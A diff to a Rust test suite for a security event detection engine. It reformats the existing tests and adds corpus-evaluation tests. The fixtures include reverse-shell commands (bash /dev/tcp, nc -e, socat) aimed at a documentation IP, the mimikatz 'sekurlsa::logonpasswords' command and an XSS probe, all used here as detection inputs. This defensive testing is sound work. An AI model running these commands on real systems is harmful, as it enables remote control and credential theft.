@@ -1110,7 +1937,10 @@ fn security_e5_claim_does_not_promote_context_components() {
 
 #[test]
 fn security_advanced_chains_require_real_bindings_and_all_stages() {
-    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-advanced-validation.json")).unwrap();
+    let corpus: Value = serde_json::from_str(include_str!(
+        "../resources/detection-advanced-validation.json"
+    ))
+    .unwrap();
     for f in corpus["fixtures"].as_array().unwrap() {
         let rule = f["rule"].as_str().unwrap();
         let events: Vec<_> = f["events"]
@@ -1121,8 +1951,16 @@ fn security_advanced_chains_require_real_bindings_and_all_stages() {
             .map(|(i, fields)| event(i, i as i64, fields.clone()))
             .collect();
         let result = run(&events);
-        let d = result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| panic!("missing {rule}"));
-        assert_eq!(d.evidence.evidence_level as u64, f["level"].as_u64().unwrap(), "{rule}");
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == rule)
+            .unwrap_or_else(|| panic!("missing {rule}"));
+        assert_eq!(
+            d.evidence.evidence_level as u64,
+            f["level"].as_u64().unwrap(),
+            "{rule}"
+        );
         if events.len() > 1 {
             for remove in 0..events.len() {
                 let mut less = events.clone();
@@ -1130,10 +1968,18 @@ fn security_advanced_chains_require_real_bindings_and_all_stages() {
                 assert!(!contains(&run(&less), rule), "missing stage: {rule}");
             }
             let mut tenant = events.clone();
-            tenant.last_mut().unwrap().fields.insert("organization.id".into(), json!("other-tenant"));
+            tenant
+                .last_mut()
+                .unwrap()
+                .fields
+                .insert("organization.id".into(), json!("other-tenant"));
             assert!(!contains(&run(&tenant), rule), "tenant: {rule}");
             let mut denied = events.clone();
-            denied.last_mut().unwrap().fields.insert("event.outcome".into(), json!("blocked"));
+            denied
+                .last_mut()
+                .unwrap()
+                .fields
+                .insert("event.outcome".into(), json!("blocked"));
             assert!(!contains(&run(&denied), rule), "denied: {rule}");
             let mut late = events.clone();
             late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
@@ -1142,7 +1988,11 @@ fn security_advanced_chains_require_real_bindings_and_all_stages() {
         for field in ["artifact.sha256", "pipeline.run.id"] {
             if events.len() > 2 && events.last().unwrap().fields.contains_key(field) {
                 let mut changed = events.clone();
-                changed.last_mut().unwrap().fields.insert(field.into(), json!("another"));
+                changed
+                    .last_mut()
+                    .unwrap()
+                    .fields
+                    .insert(field.into(), json!("another"));
                 assert!(!contains(&run(&changed), rule), "binding {field}: {rule}");
             }
         }
@@ -1158,7 +2008,11 @@ fn security_reverse_shell_is_e5_even_blocked_but_not_quoted_or_probe() {
             json!({"event.category":"web","event.action":"http_request","http.request.method":"POST","http.request.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","event.outcome":outcome}),
         );
         let r = run(&[e]);
-        let d = r.detections.iter().find(|d| d.rule == "attempt.reverse-shell.request").unwrap();
+        let d = r
+            .detections
+            .iter()
+            .find(|d| d.rule == "attempt.reverse-shell.request")
+            .unwrap();
         assert_eq!(d.evidence.evidence_level, 5);
         assert_eq!(d.evidence.outcome, outcome);
         assert_eq!(d.evidence.claim, "attempt");
@@ -1184,10 +2038,18 @@ fn security_reverse_shell_is_e5_even_blocked_but_not_quoted_or_probe() {
         "nc 192.0.2.1 4444 -e /bin/sh",
         "socat tcp:192.0.2.1:4444 exec:/bin/sh",
     ] {
-        assert!(contains(&run(&[process(0, 0, command)]), "attempt.reverse-shell.process"), "{command}");
+        assert!(
+            contains(
+                &run(&[process(0, 0, command)]),
+                "attempt.reverse-shell.process"
+            ),
+            "{command}"
+        );
     }
     let mut quoted = process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1");
-    quoted.fields.insert("event.kind".into(), json!("documentation"));
+    quoted
+        .fields
+        .insert("event.kind".into(), json!("documentation"));
     assert!(!contains(&run(&[quoted]), "attempt.reverse-shell.process"));
     let uri = event(
         0,
@@ -1200,16 +2062,26 @@ fn security_reverse_shell_is_e5_even_blocked_but_not_quoted_or_probe() {
         0,
         json!({"http.request.method":"GET","event.action":"http_request","http.response.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"}),
     );
-    assert!(!contains(&run(&[response]), "attempt.reverse-shell.request"));
+    assert!(!contains(
+        &run(&[response]),
+        "attempt.reverse-shell.request"
+    ));
 }
 
 #[test]
 fn security_expansion_positive_and_administrative_negative_pairs() {
-    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-validation.json")).unwrap();
+    let corpus: Value =
+        serde_json::from_str(include_str!("../resources/detection-validation.json")).unwrap();
     for fixture in corpus["fixtures"].as_array().unwrap() {
         let rule = fixture["rule"].as_str().unwrap();
-        assert!(contains(&run(&[event(0, 0, fixture["positive"].clone())]), rule), "positive {rule}");
-        assert!(!contains(&run(&[event(0, 0, fixture["negative"].clone())]), rule), "administrative negative {rule}");
+        assert!(
+            contains(&run(&[event(0, 0, fixture["positive"].clone())]), rule),
+            "positive {rule}"
+        );
+        assert!(
+            !contains(&run(&[event(0, 0, fixture["negative"].clone())]), rule),
+            "administrative negative {rule}"
+        );
     }
 }
 
@@ -1240,11 +2112,15 @@ fn security_tenant_request_process_and_time_boundaries() {
     edge[1].timestamp = Some(edge[0].timestamp.unwrap() + 300_001);
     assert!(!contains(&run(&edge), web));
     let (cloud, mut tenant) = chains().remove(2);
-    tenant[2].fields.insert("userIdentity.accountId".into(), json!("other"));
+    tenant[2]
+        .fields
+        .insert("userIdentity.accountId".into(), json!("other"));
     assert!(!contains(&run(&tenant), cloud));
     let (download, mut pids) = chains().remove(1);
     pids[1].fields.remove("process.parent.entity_id");
-    pids[1].fields.insert("process.parent.pid".into(), json!(42));
+    pids[1]
+        .fields
+        .insert("process.parent.pid".into(), json!(42));
     assert!(!contains(&run(&pids), download));
 }
 
@@ -1252,7 +2128,8 @@ fn security_tenant_request_process_and_time_boundaries() {
 fn security_duplicates_do_not_promote_or_supply_missing_steps() {
     let (rule, mut events) = chains().remove(2);
     for (i, e) in events.iter_mut().enumerate() {
-        e.fields.insert("eventID".into(), json!(format!("operation-{i}")));
+        e.fields
+            .insert("eventID".into(), json!(format!("operation-{i}")));
     }
     let before = run(&events);
     let mut duplicate = events[1].clone();
@@ -1262,7 +2139,10 @@ fn security_duplicates_do_not_promote_or_supply_missing_steps() {
     assert_eq!(after.duplicates, 1);
     let a = before.detections.iter().find(|d| d.rule == rule).unwrap();
     let b = after.detections.iter().find(|d| d.rule == rule).unwrap();
-    assert_eq!((a.id.as_str(), a.evidence.evidence_level), (b.id.as_str(), b.evidence.evidence_level));
+    assert_eq!(
+        (a.id.as_str(), a.evidence.evidence_level),
+        (b.id.as_str(), b.evidence.evidence_level)
+    );
     events.remove(2);
     assert!(!contains(&run(&events), rule));
 }
@@ -1280,14 +2160,20 @@ fn security_ordinary_tools_and_critical_severity_are_not_evidence() {
     ] {
         let mut e = process(0, 0, command);
         e.level = "Crítico".into();
-        assert!(run(&[e]).detections.is_empty(), "ordinary command: {command}");
+        assert!(
+            run(&[e]).detections.is_empty(),
+            "ordinary command: {command}"
+        );
     }
 }
 
 #[test]
 fn security_http_is_not_authentication_and_enrichment_is_not_execution() {
-    let mut e =
-        event(0, 0, json!({"http.request.method":"POST","url.original":"/login","http.response.status_code":200}));
+    let mut e = event(
+        0,
+        0,
+        json!({"http.request.method":"POST","url.original":"/login","http.response.status_code":200}),
+    );
     assert_ne!(crate::entities::action_outcome(&e).0, Some("logon"));
     e.name = "mimikatz".into();
     e.description = "bash -i /dev/tcp/192.0.2.1/4444".into();
@@ -1307,9 +2193,14 @@ fn security_fragment_reconstruction_and_original_references() {
     let mut last = first.clone();
     last.id = 1;
     last.fields.insert("MessageNumber".into(), json!(2));
-    last.fields.insert("ScriptBlockText".into(), json!("tcp/192.0.2.1/4444 0>&1"));
+    last.fields
+        .insert("ScriptBlockText".into(), json!("tcp/192.0.2.1/4444 0>&1"));
     let result = run(&[first.clone(), last.clone()]);
-    let d = result.detections.iter().find(|d| d.rule == "c2.reverse-shell").expect("reassembled script");
+    let d = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "c2.reverse-shell")
+        .expect("reassembled script");
     assert_eq!(d.event_ids, vec![0, 1]);
     assert_eq!(d.evidence.event_refs.len(), 2);
     let partial = crate::security_reconstruct::assemble(vec![first]).unwrap();
@@ -1334,17 +2225,29 @@ fn security_mapping_precedence_conflicts_and_provenance() {
 fn security_exact_evidence_filters_and_context_outside_cut() {
     let (_, events) = chains().remove(0);
     let full = run(&events);
-    let d = full.detections.iter().find(|d| d.rule == "chain.web.command").unwrap();
+    let d = full
+        .detections
+        .iter()
+        .find(|d| d.rule == "chain.web.command")
+        .unwrap();
     let prepared = crate::query::prepare(&d.filters);
-    assert!(events.iter().all(|e| prepared.iter().all(|f| crate::query::matches(e, f))));
+    assert!(events
+        .iter()
+        .all(|e| prepared.iter().all(|f| crate::query::matches(e, f))));
     let unrelated = process(42, 0, "whoami");
-    assert!(!prepared.iter().all(|f| crate::query::matches(&unrelated, f)));
+    assert!(!prepared
+        .iter()
+        .all(|f| crate::query::matches(&unrelated, f)));
     let value = serde_json::to_value(full).unwrap();
     let ids = std::collections::HashSet::from([1]);
     let selected = crate::triage::project(&value, 4, Some(&ids));
     assert_eq!(
-        selected["detections"].as_array().unwrap().iter().find(|d| d["rule"] == "chain.web.command").unwrap()
-            ["event_ids"]
+        selected["detections"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|d| d["rule"] == "chain.web.command")
+            .unwrap()["event_ids"]
             .as_array()
             .unwrap()
             .len(),
@@ -1357,7 +2260,11 @@ fn security_catalog_requires_reviewed_suspicion_and_never_tool_or_error_alone() 
     let rules = detections::builtin_ruleset().unwrap();
     let catalog = crate::threats::builtin_catalog();
     let settings = Settings::default();
-    let input = detections::Inputs { rules: &rules, catalog: Some(&catalog), settings: &settings };
+    let input = detections::Inputs {
+        rules: &rules,
+        catalog: Some(&catalog),
+        settings: &settings,
+    };
     for text in [
         "aws iam create-access-key",
         "aws s3 sync ./backup s3://backup",
@@ -1367,24 +2274,42 @@ fn security_catalog_requires_reviewed_suspicion_and_never_tool_or_error_alone() 
         "PSEXESVC.exe",
     ] {
         assert!(
-            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
+            detections::run(&input, &Source::Events(vec![&process(0, 0, text)]))
+                .unwrap()
+                .detections
+                .is_empty(),
             "{text}"
         );
     }
-    for text in ["echo 'sekurlsa::logonpasswords'", "Write-Output 'bash -i /dev/tcp/192.0.2.1/4'"] {
+    for text in [
+        "echo 'sekurlsa::logonpasswords'",
+        "Write-Output 'bash -i /dev/tcp/192.0.2.1/4'",
+    ] {
         assert!(
-            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
+            detections::run(&input, &Source::Events(vec![&process(0, 0, text)]))
+                .unwrap()
+                .detections
+                .is_empty(),
             "quoted: {text}"
         );
     }
     let mut documentation = process(0, 0, "sekurlsa::logonpasswords");
-    documentation.fields.insert("event.kind".into(), json!("documentation"));
-    assert!(detections::run(&input, &Source::Events(vec![&documentation])).unwrap().detections.is_empty());
+    documentation
+        .fields
+        .insert("event.kind".into(), json!("documentation"));
+    assert!(
+        detections::run(&input, &Source::Events(vec![&documentation]))
+            .unwrap()
+            .detections
+            .is_empty()
+    );
 }
 
 #[test]
 fn security_more_than_five_hundred_findings_do_not_cut_later_correlations() {
-    let mut events: Vec<_> = (0..510).map(|id| process(id, id as i64, "sekurlsa::logonpasswords")).collect();
+    let mut events: Vec<_> = (0..510)
+        .map(|id| process(id, id as i64, "sekurlsa::logonpasswords"))
+        .collect();
     let (rule, mut chain) = chains().remove(0);
     for e in &mut chain {
         e.id += events.len();
@@ -1398,9 +2323,15 @@ fn security_more_than_five_hundred_findings_do_not_cut_later_correlations() {
 #[test]
 fn security_object_names_blocked_outcomes_and_namespace_are_exact() {
     let expr = crate::querylang::compile_rule("Name:ForwardTo Value:/@/").unwrap();
-    assert!(expr.matches_object(json!({"Name":"ForwardTo","Value":"a@example.org"}).as_object().unwrap()));
+    assert!(expr.matches_object(
+        json!({"Name":"ForwardTo","Value":"a@example.org"})
+            .as_object()
+            .unwrap()
+    ));
     let mut blocked = process(0, 0, "sekurlsa::logonpasswords");
-    blocked.fields.insert("event.outcome".into(), json!("blocked"));
+    blocked
+        .fields
+        .insert("event.outcome".into(), json!("blocked"));
     let (_, normalized) = crate::security_normalize::normalize(&blocked, &[]);
     assert_eq!(normalized.get("outcome"), Some("blocked"));
     let mut a = process(1, 0, "sekurlsa::logonpasswords");
@@ -1410,10 +2341,17 @@ fn security_object_names_blocked_outcomes_and_namespace_are_exact() {
     b.id = 2;
     b.fields.insert("user.domain".into(), json!("tenant-b"));
     let result = run(&[a, b]);
-    let entities: Vec<_> = result.entities.iter().filter(|e| e.column == "@user" && e.value == "same").collect();
+    let entities: Vec<_> = result
+        .entities
+        .iter()
+        .filter(|e| e.column == "@user" && e.value == "same")
+        .collect();
     assert_eq!(entities.len(), 2);
     assert_ne!(entities[0].namespace, entities[1].namespace);
-    assert_ne!(run(&[process(1, 0, "whoami")]).analysis_id, run(&[process(2, 0, "whoami")]).analysis_id);
+    assert_ne!(
+        run(&[process(1, 0, "whoami")]).analysis_id,
+        run(&[process(2, 0, "whoami")]).analysis_id
+    );
 }
 
 #[test]
@@ -1445,9 +2383,14 @@ correlation:
   timespan: 5m
 "#;
     let evaluate = |yaml: &str, events: &[Event]| {
-        let rules = detections::test_ruleset(vec![], crate::sigma::convert_text(yaml).unwrap()).unwrap();
+        let rules =
+            detections::test_ruleset(vec![], crate::sigma::convert_text(yaml).unwrap()).unwrap();
         detections::run(
-            &detections::Inputs { rules: &rules, catalog: None, settings: &Settings::default() },
+            &detections::Inputs {
+                rules: &rules,
+                catalog: None,
+                settings: &Settings::default(),
+            },
             &Source::Events(events.iter().collect()),
         )
         .unwrap()
@@ -1458,12 +2401,30 @@ correlation:
     let mut b = process(1, 1, "whoami");
     b.fields.insert("stage".into(), json!("used"));
     b.fields.insert("used_id".into(), json!("object-1"));
-    assert!(contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
+    assert!(contains(
+        &evaluate(base, &[a.clone(), b.clone()]),
+        "sigma:chain"
+    ));
     b.timestamp = Some(a.timestamp.unwrap() - 1);
-    assert!(!contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
-    assert!(contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b.clone()]), "sigma:chain"));
+    assert!(!contains(
+        &evaluate(base, &[a.clone(), b.clone()]),
+        "sigma:chain"
+    ));
+    assert!(contains(
+        &evaluate(
+            &base.replace("temporal_ordered", "temporal"),
+            &[a.clone(), b.clone()]
+        ),
+        "sigma:chain"
+    ));
     b.fields.insert("used_id".into(), json!("another"));
-    assert!(!contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b]), "sigma:chain"));
+    assert!(!contains(
+        &evaluate(
+            &base.replace("temporal_ordered", "temporal"),
+            &[a.clone(), b]
+        ),
+        "sigma:chain"
+    ));
     let count = base[..base.find("---\ntitle: Used").unwrap()].to_string()
         + r#"
 ---
@@ -1479,57 +2440,108 @@ correlation:
 "#;
     let mut c = a.clone();
     c.id = 2;
-    assert!(!contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
+    assert!(!contains(
+        &evaluate(&count, &[a.clone(), c.clone()]),
+        "sigma:count"
+    ));
     c.fields.insert("created_id".into(), json!("object-2"));
-    assert!(contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
+    assert!(contains(
+        &evaluate(&count, &[a.clone(), c.clone()]),
+        "sigma:count"
+    ));
     a.fields.insert("bytes".into(), json!(40));
     c.fields.insert("bytes".into(), json!(60));
-    let sum = count.replace("value_count", "value_sum").replace("gte: 2, field: created_id", "gte: 100, field: bytes");
-    assert!(contains(&evaluate(&sum, &[a.clone(), c.clone()]), "sigma:count"));
+    let sum = count
+        .replace("value_count", "value_sum")
+        .replace("gte: 2, field: created_id", "gte: 100, field: bytes");
+    assert!(contains(
+        &evaluate(&sum, &[a.clone(), c.clone()]),
+        "sigma:count"
+    ));
     assert!(!contains(&evaluate(&sum, &[a.clone()]), "sigma:count"));
-    let avg = sum.replace("value_sum", "value_avg").replace("gte: 100", "gte: 50");
-    assert!(contains(&evaluate(&avg, &[a.clone(), c.clone()]), "sigma:count"));
+    let avg = sum
+        .replace("value_sum", "value_avg")
+        .replace("gte: 100", "gte: 50");
+    assert!(contains(
+        &evaluate(&avg, &[a.clone(), c.clone()]),
+        "sigma:count"
+    ));
     assert!(crate::sigma::convert_text(&sum.replace("gte: 100", "gt: 100")).is_err());
     assert!(crate::sigma::convert_text(&base.replace("temporal_ordered", "unknown_type")).is_err());
     assert!(crate::sigma::convert_text(&base.replace("[created, used]", "[chain, used]")).is_err());
-    assert!(crate::sigma::convert_text(&base.replace("stage: created", "stage|unknown_modifier: created")).is_err());
-    assert_eq!(crate::sigma::convert_text(base).unwrap()[0].def.evidence.assessed_level(), 0);
+    assert!(crate::sigma::convert_text(
+        &base.replace("stage: created", "stage|unknown_modifier: created")
+    )
+    .is_err());
+    assert_eq!(
+        crate::sigma::convert_text(base).unwrap()[0]
+            .def
+            .evidence
+            .assessed_level(),
+        0
+    );
 }
 
 #[test]
 fn security_custom_time_requires_units_or_explicit_timezone() {
     let e = event(0, 0, json!({"custom_time":"2026-09-26 10:00:00"}));
-    let mut m: crate::security_normalize::SourceMapping =
-        serde_json::from_value(json!({"source":"contract-test","fields":{"timestamp":"custom_time"}})).unwrap();
+    let mut m: crate::security_normalize::SourceMapping = serde_json::from_value(
+        json!({"source":"contract-test","fields":{"timestamp":"custom_time"}}),
+    )
+    .unwrap();
     let (view, n) = crate::security_normalize::normalize(&e, &[m.clone()]);
     assert!(view.timestamp.is_none());
     assert!(n.time.ambiguity.is_some());
     m.timezone = Some("-03:00".into());
     let (view, n) = crate::security_normalize::normalize(&e, &[m]);
-    assert_eq!(view.timestamp, crate::sources::parse_timestamp("2026-09-26T13:00:00Z"));
+    assert_eq!(
+        view.timestamp,
+        crate::sources::parse_timestamp("2026-09-26T13:00:00Z")
+    );
     assert_eq!(n.time.field, "custom_time");
 }
 
 #[test]
 fn security_audit_fragments_and_decoding_keep_original_provenance() {
-    let mut syscall = event(0, 0, json!({"audit_serial":"42","type":"SYSCALL","Computer":"host","success":"yes"}));
+    let mut syscall = event(
+        0,
+        0,
+        json!({"audit_serial":"42","type":"SYSCALL","Computer":"host","success":"yes"}),
+    );
     syscall.source = "auditd".into();
     let mut exec = syscall.clone();
     exec.id = 1;
     exec.fields.remove("success");
     exec.fields.insert("type".into(), json!("EXECVE"));
-    exec.fields
-        .extend(json!({"argc":3,"a0":"bash","a1":"-i","a2":"/dev/tcp/192.0.2.1/4"}).as_object().unwrap().clone());
-    assert_eq!(crate::security_reconstruct::key(&syscall), crate::security_reconstruct::key(&exec));
+    exec.fields.extend(
+        json!({"argc":3,"a0":"bash","a1":"-i","a2":"/dev/tcp/192.0.2.1/4"})
+            .as_object()
+            .unwrap()
+            .clone(),
+    );
+    assert_eq!(
+        crate::security_reconstruct::key(&syscall),
+        crate::security_reconstruct::key(&exec)
+    );
     let operation = crate::security_reconstruct::assemble(vec![exec, syscall]).unwrap();
-    assert_eq!(crate::entities::action_outcome(&operation.event), (Some("process_start"), Some("success")));
+    assert_eq!(
+        crate::entities::action_outcome(&operation.event),
+        (Some("process_start"), Some("success"))
+    );
     assert_eq!(operation.members.len(), 2);
-    assert!(operation.event.fields["cmdline"].as_str().unwrap().contains("/dev/tcp/"));
-    let ev = event(0, 0, json!({"http.request.body":"%3Cscript%3Ealert(1)%3C/script%3E"}));
+    assert!(operation.event.fields["cmdline"]
+        .as_str()
+        .unwrap()
+        .contains("/dev/tcp/"));
+    let ev = event(
+        0,
+        0,
+        json!({"http.request.body":"%3Cscript%3Ealert(1)%3C/script%3E"}),
+    );
     let hits = crate::threats::builtin_catalog().explain(&ev);
-    assert!(hits
-        .iter()
-        .any(|h| h.normalized && h.provenance.field == "http.request.body" && h.provenance.direction == "request"));
+    assert!(hits.iter().any(|h| h.normalized
+        && h.provenance.field == "http.request.body"
+        && h.provenance.direction == "request"));
 }
 
 #[test]
@@ -1538,13 +2550,18 @@ fn security_nat_and_homonymous_accounts_do_not_supply_success() {
     let mut success = events[0].clone();
     success.id = 5;
     success.timestamp = events[4].timestamp.map(|t| t + 1000);
-    success.fields.insert("event.outcome".into(), json!("success"));
+    success
+        .fields
+        .insert("event.outcome".into(), json!("success"));
     events.push(success);
     assert!(contains(&run(&events), "auth.bruteforce.success"));
     for field in ["user.name", "user.domain", "service.name", "host.name"] {
         let mut negative = events.clone();
         negative[5].fields.insert(field.into(), json!("different"));
-        assert!(!contains(&run(&negative), "auth.bruteforce.success"), "{field}");
+        assert!(
+            !contains(&run(&negative), "auth.bruteforce.success"),
+            "{field}"
+        );
     }
 }
 
@@ -1557,12 +2574,166 @@ fn security_pagination_preserves_complete_episodes_and_classification() {
     assert_eq!(page["counts_by_level"], full["counts_by_level"]);
     assert_eq!(page["analysis_id"], full["analysis_id"]);
     assert_eq!(page["episodes"].as_array().unwrap().len(), 1);
-    assert_eq!(page["episodes"][0]["event_refs"], full["episodes"][0]["event_refs"]);
+    assert_eq!(
+        page["episodes"][0]["event_refs"],
+        full["episodes"][0]["event_refs"]
+    );
     for d in page["detections"].as_array().unwrap() {
-        let original = full["detections"].as_array().unwrap().iter().find(|a| a["id"] == d["id"]).unwrap();
+        let original = full["detections"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|a| a["id"] == d["id"])
+            .unwrap();
         assert_eq!(original, d);
     }
     let defaults: crate::mcp::TriageParams = serde_json::from_str("{}").unwrap();
     assert_eq!(defaults.minimum_evidence.unwrap_or(5), 5);
     assert!(crate::triage::paginate(full, 0, 0).is_err());
+}
+
+#[test]
+#[ignore = "Validação específica opt-in da 0.13; execute explicitamente com --ignored"]
+fn v013_normalized_quantities_preserve_units_direction_and_originals() {
+    let original = event(
+        0,
+        0,
+        json!({"network.bytes":2048,"source.bytes":999,"destination.bytes":777,"event.duration":2500000,"transaction.amount":"123.45","transaction.currency":"BRL"}),
+    );
+    let (derived, n) = crate::security_normalize::normalize(&original, &[]);
+    assert_eq!(n.numbers["bytes"].value, 2048.0);
+    assert_eq!(n.numbers["latency"].value, 2.5);
+    assert_eq!(n.numbers["latency"].original_unit, "ns");
+    assert_eq!(n.numbers["amount"].value, 123.45);
+    assert_eq!(
+        derived.fields["source.bytes"],
+        original.fields["source.bytes"]
+    );
+    let directional = event(
+        1,
+        0,
+        json!({"source.bytes":999,"destination.bytes":777,"duration":"8"}),
+    );
+    assert!(crate::security_normalize::normalize(&directional, &[])
+        .1
+        .numbers
+        .is_empty());
+    let mut mapping:crate::security_normalize::SourceMapping=serde_json::from_value(json!({"source":"contract-test","fields":{"bytes":"source.bytes","latency":"duration"},"units":{"bytes":"KiB","latency":"s"}})).unwrap();
+    crate::security_normalize::validate_mappings(&[mapping.clone()]).unwrap();
+    let (_, n) = crate::security_normalize::normalize(&directional, &[mapping.clone()]);
+    assert_eq!(n.numbers["bytes"].value, 999.0 * 1024.0);
+    assert_eq!(n.numbers["latency"].value, 8000.0);
+    assert_eq!(n.numbers["bytes"].field, "source.bytes");
+    mapping.units.clear();
+    let (_, n) = crate::security_normalize::normalize(&directional, &[mapping.clone()]);
+    assert!(n.numbers.is_empty());
+    assert!(n.limitations.iter().any(|v| v.contains("unidade")));
+    mapping.units.insert("latency".into(), "KB".into());
+    assert!(crate::security_normalize::validate_mappings(&[mapping]).is_err());
+    let invalid = event(2, 0, json!({"network.bytes":-1,"event.duration":"NaN"}));
+    assert!(crate::security_normalize::normalize(&invalid, &[])
+        .1
+        .numbers
+        .is_empty());
+}
+
+#[test]
+#[ignore = "Corpus extensivo opt-in; não participa da validação mínima da 0.13"]
+fn v013_versioned_corpus_evaluates_full_population_and_origin_time_holdout() {
+    let corpus: Value = serde_json::from_str(include_str!(
+        "../tests/fixtures/security/investigation-corpus.json"
+    ))
+    .unwrap();
+    let rules = detections::builtin_ruleset().unwrap();
+    let mut evaluation = serde_json::Map::new();
+    let mut errors = Vec::new();
+    for sample in corpus["cases"].as_array().unwrap() {
+        let mut settings: Settings = serde_json::from_value(sample["settings"].clone()).unwrap();
+        settings.threats = false;
+        let events = sample["events"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .enumerate()
+            .map(|(id, record)| {
+                let mut event = Event::empty();
+                event.id = id;
+                event.event_ref = format!("{}:{id}", sample["id"].as_str().unwrap());
+                event.source = sample["origin"].as_str().unwrap().into();
+                event.timestamp = record["timestamp"].as_i64();
+                event.fields = record["fields"].as_object().unwrap().clone();
+                event.parse_status = "parsed".into();
+                event
+            })
+            .collect::<Vec<_>>();
+        let result = detections::run_stored(
+            &detections::Inputs {
+                rules: &rules,
+                catalog: None,
+                settings: &settings,
+            },
+            &Source::Events(events.iter().collect()),
+        )
+        .unwrap();
+        assert_eq!(result.metadata["complete"], true);
+        assert_eq!(result.metadata["investigation"]["population"], events.len());
+        let signals = result
+            .investigation_page("signals", None, None, None, 0, 100)
+            .unwrap();
+        let expected = sample["expected_signal"].as_str().unwrap();
+        let matches = signals["items"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|s| {
+                s["kind"].as_str().is_some_and(|k| {
+                    k == expected
+                        || k.strip_prefix(expected)
+                            .is_some_and(|tail| tail.starts_with(':'))
+                })
+            })
+            .collect::<Vec<_>>();
+        let predicted = !matches.is_empty();
+        let positive = sample["positive"].as_bool().unwrap();
+        let key = format!(
+            "{}.{}",
+            sample["split"].as_str().unwrap(),
+            sample["scenario"].as_str().unwrap()
+        );
+        let counts = evaluation
+            .entry(key)
+            .or_insert(json!({"tp":0,"fp":0,"fn":0,"tn":0,"cases":0,"population":0}));
+        let kind = match (positive, predicted) {
+            (true, true) => "tp",
+            (false, true) => "fp",
+            (true, false) => "fn",
+            _ => "tn",
+        };
+        counts[kind] = json!(counts[kind].as_u64().unwrap() + 1);
+        counts["cases"] = json!(counts["cases"].as_u64().unwrap() + 1);
+        counts["population"] = json!(counts["population"].as_u64().unwrap() + events.len() as u64);
+        if predicted != positive {
+            errors.push(format!(
+                "{} expected {positive}, observed {predicted}",
+                sample["id"]
+            ));
+        }
+        for signal in matches {
+            assert_eq!(signal["evidence_level"], 0);
+            let members = result
+                .investigation_page("members", None, None, signal["id"].as_str(), 0, 100)
+                .unwrap();
+            assert_eq!(
+                members["total"], sample["expected_members"],
+                "{}",
+                sample["id"]
+            );
+        }
+    }
+    let report = json!({"version":corpus["version"],"synthetic":true,"holdout":corpus["holdout"],"calibrated":false,"meaning":corpus["meaning"],"results":evaluation,"mismatches":errors,"normalization_version":crate::evidence::NORMALIZATION_VERSION,"backend":crate::security_packs::VERSION});
+    println!("SECURITY_CORPUS {report}");
+    if let Ok(path) = std::env::var("SECURITY_EVALUATION_PATH") {
+        std::fs::write(path, serde_json::to_vec_pretty(&report).unwrap()).unwrap();
+    }
+    assert!(errors.is_empty(), "{errors:?}");
 }
